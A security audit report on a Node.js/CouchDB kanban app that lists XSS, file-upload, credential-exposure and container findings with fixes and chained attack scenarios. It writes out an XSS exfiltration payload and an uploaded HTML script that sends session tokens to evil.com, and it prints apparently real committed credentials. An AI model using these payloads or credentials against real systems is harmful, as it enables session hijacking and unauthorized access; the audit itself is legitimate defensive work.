# Security Audit Report — jc-kanban

**Date:** 2026-05-02 | **Codebase:** commit 300246d | **Stack:** Express 5 / Node.js, vanilla JS SPA, CouchDB, Docker

---

## 1. Vulnerability Summary

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 9 |
| Medium | 10 |
| Low | 7 |
| **Total** | **29** |

---

## 2. Checklist

### Critical
- [x] CRIT-01 — Purge `.env` from git history and rotate all credentials *(`.env` untracked; history purge + credential rotation required — see note below)*
- [x] CRIT-02 — Wrap all `marked.parse()` → `innerHTML` with `DOMPurify.sanitize()`
- [x] CRIT-03 — Set `LOG_API_RESPONSES=false`; redact sensitive fields in logging middleware

### High
- [x] HIGH-01 — Document single-user constraint or implement per-board access control *(documented in README.md and CLAUDE.md)*
- [x] HIGH-02 — Add `ajv` JSON Schema validation on `PUT /api/:board/board` and `PUT /api/:board/notes`
- [x] HIGH-03 — Add multer `fileFilter` blocking dangerous extensions (`.html`, `.htm`, `.svg`, `.js`, etc.); add `Content-Disposition: attachment` on file-serve
- [x] HIGH-04 — Replace `sessionStorage` token with `httpOnly; Secure; SameSite=Strict` cookie
- [x] HIGH-05 — Remove the `?login=` URL query parameter feature
- [x] HIGH-06 — Restrict CouchDB to `127.0.0.1:5984:5984`; remove port mapping in production
- [x] HIGH-07 — Add `helmet` middleware (CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy)
- [x] HIGH-08 — Return only a masked API key from `GET /api/settings`; remove `logApiResponses`
- [x] HIGH-09 — Add a non-root `USER` directive in `Dockerfile`

### Medium
- [x] MED-01 — Add `express-rate-limit` on all authenticated write endpoints
- [x] MED-02 — Strip `__proto__`, `constructor`, `prototype` keys before any CouchDB write
- [x] MED-03 — Fix `res.sendFile` to use the `root` option; reject null bytes in `safeFilename`
- [x] MED-04 — Set `app.set('trust proxy', 1)` when deployed behind a reverse proxy
- [x] MED-05 — Switch to signed, time-limited session tokens (JWT/PASETO) with expiry
- [x] MED-06 — Use `path.basename(f)` for ZIP entry names; validate no `..` in archive paths
- [x] MED-07 — Set `chmod 700` on `./data`; consider encrypting backups at rest
- [x] MED-08 — Remove `logApiResponses` from `GET /api/settings` response
- [x] MED-09 — Remove live source code bind-mounts from production compose; move to `docker-compose.override.yml`
- [x] MED-10 — Remove unused `cors` package or configure it explicitly

### Low
- [ ] LOW-01 — Fix `safeEqual` to compare lengths before timing-safe comparison
- [ ] LOW-02 — Replace `Math.random()` IDs with `crypto.randomBytes` (server) / `crypto.getRandomValues` (browser)
- [x] LOW-03 — Remove or gate the Fauxton link in the Settings dialog
- [ ] LOW-04 — Add `sandbox` attribute to dynamically created `<iframe>` elements
- [ ] LOW-05 — Remove `?login=` URL feature (see HIGH-05); eliminates extension memory risk
- [ ] LOW-06 — Generate API key with `openssl rand -hex 32`
- [ ] LOW-07 — Add `.env.example` with placeholder values; ensure `.env` stays out of source control

---

## 3. Detailed Findings

---

### CRIT-01 — `.env` With Real Credentials Committed to Git History

**Severity:** Critical
**Component:** Repository root `.env`

**Description:**
`.env` is tracked by git. Adding it to `.gitignore` stops *future* tracking but does not remove it from history. All historical commits expose:

```
APP_PASSWORD=kanban.2712
API_KEY=4T398-HJK45-09KL9-ASED3
COUCHDB_PASSWORD=kanban-pwd
```

**Exploitation:**
Anyone with repo access runs `git log --all -- .env && git show <SHA>:.env` to extract all credentials.

**Impact:** Full application compromise, CouchDB admin takeover, permanent API access.

**Fix:**
1. `git rm --cached .env`
2. Purge history: `git filter-repo --path .env --invert-paths`
3. Rotate **all** credentials immediately
4. Force-push rewritten history

---

### CRIT-02 — Stored XSS via Unsanitized `marked.parse()` → `innerHTML`

**Severity:** Critical
**Component:** `app/public/cards.js:98`, `app/public/notes.js:531`

**Description:**
Card and note descriptions are rendered with `marked.parse(text)` and assigned directly to `element.innerHTML` with no HTML sanitizer. `marked` v18 passes raw HTML through unchanged — `<script>` tags and event handlers survive intact.

**Exploitation:**
1. Attacker POSTs to `POST /api/<board>/import` with `description: '<img src=x onerror="fetch(atob(exfiltPayload))">'`
2. Any user who opens the board triggers the payload
3. Payload reads `sessionStorage.getItem('kanban-auth')` and exfiltrates the session token

**Impact:** Session token theft, persistent XSS affecting all board viewers.

**Fix:**
```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(marked.parse(text, { breaks: true }));
```
Apply to every `marked.parse()` → `innerHTML` assignment in `cards.js` and `notes.js`.

---

### CRIT-03 — Plaintext Credentials and Session Tokens Logged (`LOG_API_RESPONSES=true`)

**Severity:** Critical
**Component:** `app/server.js:60-71`, `.env`

**Description:**
The committed `.env` has `LOG_API_RESPONSES=true`. The logging middleware records full `req.body` and `res.body` for every `/api/*` request, including:

- `POST /api/auth` request body → `{ "password": "kanban.2712" }`
- `POST /api/auth` response body → `{ "ok": true, "token": "<64-hex-char token>" }`
- `GET /api/settings` response → `{ "apiKey": "4T398-..." }`

The client-side counterpart in `settings.js:568-585` also re-wraps `window.fetch` and logs all headers (including `x-auth-token`) to the browser console.

**Impact:** Any access to container logs or browser console yields live session tokens and credentials.

**Fix:** Set `LOG_API_RESPONSES=false`. Redact `password`, `token`, and `apiKey` fields in the middleware before printing.

---

### HIGH-01 — No Per-Board Authorization (IDOR/BOLA)

**Severity:** High
**Component:** `app/server.js` — all `/api/:board/*` endpoints

**Description:**
Authentication is a single global password. One valid session token or API key grants full read/write/delete access to **all** boards. There is no per-board permission model.

**Fix:** Implement per-board access tokens, or clearly document that this is a strictly single-user system and block multi-user deployment.

---

### HIGH-02 — No Input Validation on `PUT /api/:board/board` and `PUT /api/:board/notes`

**Severity:** High
**Component:** `app/server.js:392-395`, `app/server.js:447-450`

**Description:**
`req.body` is written to CouchDB verbatim with no schema validation. An attacker can inject:
- `_deleted: true` → marks the document for deletion on next compaction
- Arbitrary deeply-nested objects → force unexpected server behavior
- Oversized payloads up to the 10 MB Express limit → DoS vector

**Fix:** Add `ajv` JSON Schema validation enforcing the documented data model before any CouchDB write.

---

### HIGH-03 — Unrestricted File Upload (HTML/SVG/JS Accepted, Served Same-Origin)

**Severity:** High
**Component:** `app/server.js:561-576` (notes), `app/server.js:645-660` (cards)

**Description:**
Multer has no `fileFilter`. Any file type is accepted — `.html`, `.svg`, `.js`, etc. Files are served by `res.sendFile()` which auto-detects MIME type from extension. An uploaded `.html` file executes in the browser with full same-origin privileges.

**Exploitation:**
1. Upload `steal.html` → `<script>document.location='https://evil.com/?t='+sessionStorage.getItem('kanban-auth')</script>`
2. Share link `/api/<board>/notes/attachments/<pageId>/steal.html`
3. Victim clicks → session token exfiltrated

**Fix:**
```js
const BLOCKED_EXTS = new Set(['html','htm','svg','js','mjs','php','py','sh','bat','exe','ps1']);
fileFilter(req, file, cb) {
  const ext = path.extname(file.originalname).slice(1).toLowerCase();
  cb(null, !BLOCKED_EXTS.has(ext));
}
```
Also add `Content-Disposition: attachment` on file-serve responses.

---

### HIGH-04 — Session Token Stored in `sessionStorage` (Accessible to XSS)

**Severity:** High
**Component:** `app/public/settings.js:59`, `app/public/state.js:10`

**Description:**
The token returned by `POST /api/auth` is stored in `sessionStorage` under `kanban-auth` and injected into every fetch. `sessionStorage` is fully readable by any script on the same origin — including via CRIT-02 and HIGH-03.

**Fix:** Replace with an `httpOnly; Secure; SameSite=Strict` cookie. The token becomes inaccessible to JavaScript while remaining automatically sent with requests.

---

### HIGH-05 — Password Exposed via URL Query Parameter (`?login=`)

**Severity:** High
**Component:** `app/public/settings.js:68-73`

**Description:**
```js
const urlPwd = params.get('login');
if (urlPwd) {
  history.replaceState({}, '', location.pathname);
  if (await tryLogin(urlPwd)) return;
}
```
The plaintext password travels as `?login=<password>`. Before `replaceState` runs, the value lands in:
- Browser history
- Server and proxy access logs (in the URL)
- `Referer` headers on any outbound navigation
- Browser extensions monitoring URL changes

**Fix:** Remove this feature entirely. If one-click login is needed, implement a time-limited single-use token instead.

---

### HIGH-06 — CouchDB Admin Interface Exposed on Host Port 5984

**Severity:** High
**Component:** `docker-compose.yml:10-11`

**Description:**
```yaml
ports:
  - "5984:5984"
```
CouchDB Fauxton and the full CouchDB HTTP API are bound to `0.0.0.0:5984`. The credentials (`kanban` / `kanban-pwd`) are committed to git. Anyone on the same network — or the public internet if the host is reachable — can authenticate directly to CouchDB, bypassing the application entirely.

**Fix:** Change to `"127.0.0.1:5984:5984"`. In production, remove the mapping entirely and use only the internal Docker network.

---

### HIGH-07 — No HTTP Security Headers (No CSP, X-Frame-Options, HSTS, etc.)

**Severity:** High
**Component:** `app/server.js` — no security headers middleware

| Missing Header | Risk |
|---|---|
| `Content-Security-Policy` | Inline JS runs freely; no browser barrier against XSS |
| `X-Frame-Options` / `frame-ancestors` | Clickjacking |
| `X-Content-Type-Options: nosniff` | MIME sniffing on uploaded files |
| `Strict-Transport-Security` | No HTTPS enforcement |
| `Referrer-Policy` | Password leaks in `Referer` (HIGH-05) |

**Fix:**
```js
const helmet = require('helmet');
app.use(helmet({ contentSecurityPolicy: { directives: {
  defaultSrc: ["'self'"], scriptSrc: ["'self'"],
  styleSrc: ["'self'", "'unsafe-inline'"], imgSrc: ["'self'","data:","https:"],
  connectSrc: ["'self'"], frameSrc: ["'none'"]
}}}));
```
Note: inline `onclick=` handlers and `innerHTML` assignments must be refactored before a strict CSP is viable.

---

### HIGH-08 — `GET /api/settings` Returns Full API Key to Any Authenticated User

**Severity:** High
**Component:** `app/server.js:257-259`

**Description:**
```js
res.json({ apiKey: API_KEY || null, logApiResponses: LOG_API_RESPONSES });
```
The full plaintext API key is returned to the browser and displayed in the Settings dialog. A user with temporary access (shared device, shoulder-surfing) can extract the permanent API key.

**Fix:** Return only a masked value (e.g., `4T39...ED3`) or a boolean `apiKeyConfigured: true`.

---

### HIGH-09 — Docker Container Runs as Root

**Severity:** High
**Component:** `app/Dockerfile`

**Description:**
No `USER` directive is present — Node runs as root inside the container. An RCE via any dependency vulnerability or code injection gives the attacker root-level access to the container and the mounted `./data` volume.

**Fix:**
```dockerfile
RUN addgroup -S kanban && adduser -S kanban -G kanban
USER kanban
```

---

### MED-01 — No Rate Limiting on Authenticated Write Endpoints

**Severity:** Medium
**Component:** `app/server.js` — import, upload, board-write endpoints

Rate limiting exists only on `POST /api/auth`. An attacker with a valid session can spam imports (flooding the board), repeatedly upload 50 MB files (exhausting disk), or send 10 MB JSON bodies at high frequency to DoS the server.

**Fix:** Add `express-rate-limit` on all write endpoints. Add a per-board total-size check before accepting writes.

---

### MED-02 — Prototype Pollution via Unchecked JSON Body Merged Into CouchDB Documents

**Severity:** Medium
**Component:** `app/server.js:393`, `app/server.js:448`

`req.body` is written to CouchDB without stripping `__proto__`, `constructor`, or `prototype` keys. While `JSON.parse` doesn't create polluted prototypes directly, spreading the retrieved document back into plain objects on subsequent reads could produce unexpected behavior.

**Fix:** Strip prototype-related keys before any spread, or use `ajv` schema validation (see HIGH-02).

---

### MED-03 — `res.sendFile` Without `root` Option; `safeFilename` Allows Null Bytes

**Severity:** Medium
**Component:** `app/server.js:609`, `app/server.js:693`

```js
const fp = path.join(ATTACHMENTS_DIR, board, pageId, filename);
res.sendFile(fp);  // no root option
```

`safeFilename` does not reject null bytes (`\x00`). On some OS/filesystem combinations a null byte truncates a path string, potentially serving a different file. Express's documentation strongly recommends always passing `root`.

**Fix:**
```js
res.sendFile(path.basename(filename), { root: path.join(ATTACHMENTS_DIR, board, pageId) });
```
Add `&& !name.includes('\x00')` to `safeFilename`.

---

### MED-04 — Rate Limiter Bypassed When Behind a Reverse Proxy (`req.ip` = proxy IP)

**Severity:** Medium
**Component:** `app/server.js:217`, `app/server.js:227`

Without `app.set('trust proxy', 1)`, `req.ip` is always the proxy's IP — all users share a single rate-limit bucket, defeating the protection entirely.

**Fix:** Set `app.set('trust proxy', 1)` when deployed behind exactly one trusted reverse proxy and document this requirement.

---

### MED-05 — Session Token Is Process-Singleton; No Expiry

**Severity:** Medium
**Component:** `app/server.js:15`

```js
const SESSION_TOKEN = crypto.randomBytes(32).toString('hex');
```

One global token is generated at startup. It never expires — a leaked token is valid indefinitely until the server restarts. Any server restart (deployment, crash) invalidates all sessions simultaneously.

**Fix:** Use signed, time-limited tokens (JWT with short expiry or PASETO) stored as `httpOnly` cookies, or persist a token secret in the environment rather than regenerating it at startup.

---

### MED-06 — Zip Slip Risk in Notes Export (User-Controlled Filenames in Archive)

**Severity:** Medium
**Component:** `app/server.js:748`

```js
archive.file(path.join(aDir, f), { name: dir + 'attachments/' + f });
```

`dir` is built from `page.title` with only a narrow set of characters replaced. A title containing Unicode lookalikes of `/` or a value like `...` produces unexpected ZIP entry paths. If a filename starting with `../` were ever present on disk, it would produce a Zip Slip archive.

**Fix:** Use `path.basename(f)` for archive entry names. Validate that no computed ZIP entry path contains `..`.

---

### MED-07 — Backup Files Contain Full Plaintext Board State on Host Filesystem

**Severity:** Medium
**Component:** `app/server.js:763-780`, `docker-compose.yml` volume `./data`

Full JSON exports (all cards, notes, descriptions) are written to `./data/json/` every 10 minutes. Default directory permissions on developer machines are often world-readable.

**Fix:** Ensure `./data` is `chmod 700`. Consider encrypting backups at rest.

---

### MED-08 — `logApiResponses` Setting Returned to Client; Enables Console Token Logging

**Severity:** Medium
**Component:** `app/server.js:258`, `app/public/settings.js:568-585`

When the server returns `logApiResponses: true`, the frontend monkey-patches `window.fetch` to log all request/response bodies to the browser console — including the `x-auth-token` header on every API call.

**Fix:** Remove `logApiResponses` from the `GET /api/settings` response entirely. Server-side logging behavior should not be controlled or reflected through the client.

---

### MED-09 — Live Source Code Bind-Mounted Into the Running Container

**Severity:** Medium
**Component:** `docker-compose.yml:33-34`

```yaml
volumes:
  - ./app/public:/app/public
  - ./app/server.js:/app/server.js
```

Any process on the host with write access to `./app/server.js` immediately modifies the running application. This is a container escape-equivalent risk.

**Fix:** Remove these bind-mounts from the production compose file. Keep them only in a `docker-compose.override.yml` for development.

---

### MED-10 — `cors` Package Listed as Dependency but Never Used

**Severity:** Medium (supply-chain surface + misleading)
**Component:** `app/package.json:17`

`cors` is in `dependencies` but never `require()`d. This creates confusion about the CORS policy and inflates the attack surface. Future developers may assume CORS is already configured.

**Fix:** Remove it from `dependencies` or configure it explicitly with a strict `origin` allowlist.

---

### LOW-01 — `safeEqual` Truncates Inputs at 128 Bytes

**Severity:** Low
**Component:** `app/server.js:158-164`

```js
const bufA = Buffer.alloc(128);
Buffer.from(String(a || '')).copy(bufA, 0, 0, 128);
```

Two values that share the same first 128 bytes but differ beyond that will compare as equal. The current `SESSION_TOKEN` is 64 hex chars (safe), but any future longer token silently becomes vulnerable to prefix-collision authentication.

**Fix:**
```js
function safeEqual(a, b) {
  const sa = String(a || ''), sb = String(b || '');
  if (sa.length !== sb.length) return false;
  return crypto.timingSafeEqual(Buffer.from(sa), Buffer.from(sb));
}
```

---

### LOW-02 — Card/Column IDs Use `Math.random()` (Not Cryptographically Unpredictable)

**Severity:** Low
**Component:** `app/public/state.js:175`, `app/server.js:510`, `app/server.js:529`

```js
const uid = () => 'id-' + Math.random().toString(36).slice(2, 9);
```

IDs used in attachment paths and linked-card references are predictable. An attacker who can guess a card ID can probe attachment endpoints.

**Fix:** `crypto.randomBytes(6).toString('hex')` on the server; `crypto.getRandomValues()` in the browser.

---

### LOW-03 — Fauxton Link in Settings Reveals CouchDB Port to All Users

**Severity:** Low
**Component:** `app/public/settings.js:177-178`

The Settings dialog directly links to `http://<hostname>:5984/_utils`, advertising the internal CouchDB address and port. If CouchDB should not be user-accessible (see HIGH-06), remove this link.

---

### LOW-04 — PDF Viewer Uses Unsandboxed `<iframe>`

**Severity:** Low
**Component:** `app/public/notes.js:910-912`

PDFs are displayed in an `<iframe>` with no `sandbox` attribute. A malicious PDF exploiting a browser PDF-renderer vulnerability would run with full same-origin privileges.

**Fix:** `iframe.sandbox = "allow-scripts allow-same-origin"` (minimum needed for PDF rendering).

---

### LOW-05 — `?login=` Password Persists in Browser Extension Memory

**Severity:** Low
**Component:** `app/public/settings.js:68-72`

Supplement to HIGH-05: even after `history.replaceState`, browser extensions monitoring the `navigation` API or `document.location` may record the password before the replacement executes.

---

### LOW-06 — API Key Is Short and Low-Entropy

**Severity:** Low
**Component:** `.env` line `API_KEY=4T398-HJK45-09KL9-ASED3`

23 characters in a predictable dash-grouped format. The server itself logs a warning about this at startup, yet the committed `.env` uses this value.

**Fix:** `openssl rand -hex 32` → 64-character cryptographically random key.

---

### LOW-07 — Board Name Collision in Backup Filenames

**Severity:** Low
**Component:** `app/server.js:772`

A board name with a leading/trailing hyphen (from an import bug) could produce unexpected filenames like `kanban--board.json`, potentially creating ambiguity or overwrite issues.

---

## 3. Attack Chains

### Chain A — Git Repo → Stored XSS → Full Session Hijack

**No authentication required to begin.**

1. **CRIT-01** — Clone the repo (or check history) → extract `API_KEY=4T398-HJK45-09KL9-ASED3`
2. **HIGH-01** — Call `GET /api/boards` with `x-api-key: 4T398-...` → enumerate all boards
3. **CRIT-02 + HIGH-02** — `POST /api/<board>/import` with malicious `description` containing an `onerror` XSS payload that POSTs `sessionStorage.getItem('kanban-auth')` to an attacker-controlled server
4. **CRIT-02** — Next legitimate user opens the board → XSS fires
5. **HIGH-04** — Token extracted from `sessionStorage` and exfiltrated
6. Attacker holds a valid long-lived session token → full read/write/delete access to all boards indefinitely

**Severity: Critical end-to-end. Requires only public repo access.**

---

### Chain B — Authenticated Upload → Same-Origin HTML Execution → Session Hijack

**Requires one authenticated session (e.g., the attacker has the password).**

1. **HIGH-03** — Upload `steal.html` with JS payload to any note attachment endpoint
2. File served from same origin at `/api/<board>/notes/attachments/<pageId>/steal.html`
3. Attacker embeds the URL as a Markdown link in a note description (or sends directly)
4. Victim clicks the link → browser executes the HTML on the same origin
5. **HIGH-04** — Script reads `sessionStorage` token → exfiltrated
6. Attacker impersonates the victim with a long-lived token

---

### Chain C — Log Access → Credential Extraction → CouchDB Takeover

**Requires access to Docker container logs or browser DevTools.**

1. **CRIT-03** — `LOG_API_RESPONSES=true`; container stdout contains plaintext password and tokens
2. Attacker reads `POST /api/auth` log entries → recovers `APP_PASSWORD`
3. **HIGH-06** — CouchDB port 5984 is open; attacker authenticates with `COUCHDB_PASSWORD` (same value, committed in CRIT-01) directly to Fauxton
4. Attacker reads, modifies, or drops all databases — bypassing all application-layer controls

---

### Chain D — Host Filesystem Write → Server Code Injection → RCE

**Requires host write access (compromised dev machine, CI/CD pipeline, supply chain).**

1. **MED-09** — `./app/server.js` is bind-mounted into the running container
2. Attacker writes a backdoor (reverse shell, data exfiltration) to `./app/server.js` on the host
3. The modified code is live immediately on the next HTTP request — no container restart required
4. **HIGH-09** — Node process runs as root inside the container → no privilege barrier to the mounted `./data` volume or potential container escape

---

## 4. Secure Design Recommendations

### Immediate (before any production exposure)

| # | Action |
|---|--------|
| 1 | Purge `.env` from git history (`git filter-repo`) and rotate all credentials |
| 2 | Set `LOG_API_RESPONSES=false` in production; redact sensitive fields in the middleware |
| 3 | Restrict CouchDB: `"127.0.0.1:5984:5984"` in compose; remove mapping in production |
| 4 | Wrap every `marked.parse()` → `innerHTML` with `DOMPurify.sanitize()` |
| 5 | Add multer `fileFilter` blocking `.html`, `.htm`, `.svg`, `.js`, `.php`, `.sh` |

### Short-term (within one sprint)

| # | Action |
|---|--------|
| 6 | Replace `sessionStorage` token with `httpOnly; Secure; SameSite=Strict` cookie |
| 7 | Add `helmet` middleware for all security headers (CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy) |
| 8 | Remove live source code bind-mounts from production compose; move to `docker-compose.override.yml` |
| 9 | Add a non-root `USER` in `Dockerfile` |
| 10 | Fix `res.sendFile` to use the `root` option; add null-byte check to `safeFilename` |
| 11 | Remove the `?login=` URL feature |
| 12 | Return only a masked API key from `GET /api/settings`; remove `logApiResponses` from the response |
| 13 | Set `app.set('trust proxy', 1)` when deployed behind a reverse proxy |
| 14 | Add `Content-Disposition: attachment` header on file-serve responses |

### Medium-term (architecture)

| # | Action |
|---|--------|
| 15 | Add `ajv` JSON Schema validation on all board/notes write endpoints |
| 16 | Add `express-rate-limit` on import, upload, and all board-write routes |
| 17 | Replace `Math.random()` IDs with `crypto.randomBytes` (server) / `crypto.getRandomValues` (browser) |
| 18 | Fix `safeEqual` to compare lengths before timing-safe comparison |
| 19 | Switch to signed, time-limited session tokens (JWT/PASETO) with token expiry |
| 20 | Add a `.env.example` with placeholder values; ensure real `.env` is never committed again |
| 21 | Add `sandbox` attribute to all dynamically created `<iframe>` elements |
| 22 | Remove the unused `cors` package or configure it explicitly with a strict `origin` allowlist |
